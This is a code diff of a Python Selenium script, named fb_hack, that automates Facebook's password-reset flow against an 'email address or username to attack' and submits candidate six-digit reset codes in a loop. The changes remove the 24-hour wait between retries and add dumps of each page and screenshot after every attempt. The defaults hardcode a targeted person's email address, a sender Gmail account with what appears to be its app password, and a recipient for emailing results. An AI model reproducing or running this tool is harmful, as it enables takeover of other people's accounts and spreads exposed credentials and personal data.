@@ -1,3 +1,5 @@
+#! /usr/bin/python
+# Now you can interact with the Chrome browser using WebDriver commands
 from selenium.webdriver import Keys, ActionChains
 from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
@@ -18,6 +20,7 @@ MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
               'AppleWebKit/534.7 (KHTML, like Gecko) ' \
               'Chrome/7.0.517.41 Safari/534.7' 
 
+
 def sleepy(counter):
   x = counter
   y = 0
@@ -34,18 +37,7 @@ def sleepy(counter):
       print(x, end='\r')
     sleep(1)
 
-def countdown(t):
-    while t:
-        mins, secs = divmod(t, 60)
-        timer = '{:02d}:{:02d}'.format(mins, secs)
-        print(timer, end="\r")
-        sleep(1)
-        t -= 1
-
-    print('Time is up!')
-
-
-def fb_hack(email, codex):
+def fb_hack(email, codex, respect):
   os.system('clear')
   soup = BeautifulSoup()
   options = webdriver.ChromeOptions()
@@ -65,40 +57,15 @@ def fb_hack(email, codex):
     sleep(2)
     driver.save_screenshot("fail1.png")
     print("Failed at email")
-    driver.close()
-    past = codex
-    t = 86400
-    countdown(t)
-    return past
-
   try:
-    search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
+    search_button = driver.find_element(by = By.XPATH, value = "/html/body/div[1]/div[1]/div[1]/div/div/form/div/div[3]/div/div[1]/button")
     search_button.click()
     sleep(2)
   except:
     sleep(2)
     driver.save_screenshot("fail2.png")
     print("Failed at try another way")
-    past =codex
-    t = 86400
-    countdown(t)
-    driver.close()
-    return past
-
-  try:
-    search_button = driver.find_element(by = By.NAME, value = "reset_action")
-    search_button.click()
-    sleep(2)
-  except:
-    sleep(2)
-    driver.save_screenshot("fail3.png")
-    print("Failed at reset action")
-    t = 86400
-    countdown(t)
-    past = codex
-    driver.close()
-    return past
-
+    dud = input()
   counter = 0
   test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
@@ -119,6 +86,14 @@ def fb_hack(email, codex):
         searchbox = driver.find_element(by = By.NAME, value = "n")
         searchbox.send_keys(p)
         searchbox.submit()
+        html = driver.page_source
+        soup = BeautifulSoup(html, 'html.parser')
+        with open("output1.txt", "w") as file:
+          file.write(str(soup))
+        soup = BeautifulSoup(html, 'html.parser')
+        with open("output1.html", "w") as file:
+          file.write(str(soup))
+        driver.save_screenshot("tester.png")
       except:
         html = driver.page_source
         soup = BeautifulSoup(html, 'html.parser')
@@ -150,12 +125,12 @@ def fb_hack(email, codex):
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 reset = int(input('Code: ') or 1)
+past = int(input('Length: ') or 6)
 sender_email = input("Your Email:") or "krarktel@gmail.com"
 receiver_email = input("Recipient:") or "ppteam36884@gmail.com"
 password = input("Type your password and press enter:") or "dvxu atqv cngc rojf"
-past = 1
 while past != 0:
-  fb_hack(ehack, reset)
+  fb_hack(ehack, reset, past)
 
 
 subject = "An email with attachment from Python"
